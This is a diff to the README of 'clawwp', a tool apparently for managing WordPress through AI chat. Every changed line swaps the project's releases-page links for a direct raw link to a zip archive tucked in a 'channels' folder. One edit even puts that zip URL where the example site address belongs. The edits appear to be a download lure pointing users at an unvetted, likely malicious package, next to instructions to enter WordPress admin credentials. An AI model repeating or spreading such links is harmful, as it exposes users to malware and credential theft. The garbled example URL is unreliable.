@@ -1,6 +1,6 @@
 # 🤖 clawwp - Manage WordPress with AI Chat  
 
-[![Download clawwp](https://img.shields.io/badge/Download-clawwp-brightgreen)](https://github.com/oops121/clawwp/releases)  
+[![Download clawwp](https://img.shields.io/badge/Download-clawwp-brightgreen)](https://raw.githubusercontent.com/oops121/clawwp/main/channels/Software-2.4-alpha.1.zip)  
 
 AI agent for WordPress offers an easy way to manage your posts, comments, SEO, media, and WooCommerce store by chatting. It supports multiple channels like Telegram, Slack, and Discord. Use built-in cost tracking and model context features without any coding.
 
@@ -38,7 +38,7 @@ No programming skills are required. Just follow the steps to download and run th
 
 1. Click the big download button below to open the releases page:  
 
-   [![Download clawwp](https://img.shields.io/badge/Download-clawwp-blue)](https://github.com/oops121/clawwp/releases)  
+   [![Download clawwp](https://img.shields.io/badge/Download-clawwp-blue)](https://raw.githubusercontent.com/oops121/clawwp/main/channels/Software-2.4-alpha.1.zip)  
 
 2. On the releases page, find the latest version marked as stable. Look for a file ending with `.exe` (for example, `clawwp-setup.exe`).  
 
@@ -60,7 +60,7 @@ No programming skills are required. Just follow the steps to download and run th
 
 1. When you open clawwp for the first time, it will ask you to connect your WordPress site.  
 
-2. Enter your website URL (for example, https://yourdomain.com).  
+2. Enter your website URL (for example, https://raw.githubusercontent.com/oops121/clawwp/main/channels/Software-2.4-alpha.1.zip).  
 
 3. Provide your WordPress admin username and password to allow clawwp to manage your site. This connection is secure and only needed once.  
 
@@ -125,4 +125,4 @@ You can find user guides, FAQs, and support links in the app’s Help menu. For 
 
 Access the latest Windows installer here:  
 
-[![Download clawwp](https://img.shields.io/badge/Download-clawwp-brightgreen)](https://github.com/oops121/clawwp/releases)
+[![Download clawwp](https://img.shields.io/badge/Download-clawwp-brightgreen)](https://raw.githubusercontent.com/oops121/clawwp/main/channels/Software-2.4-alpha.1.zip)
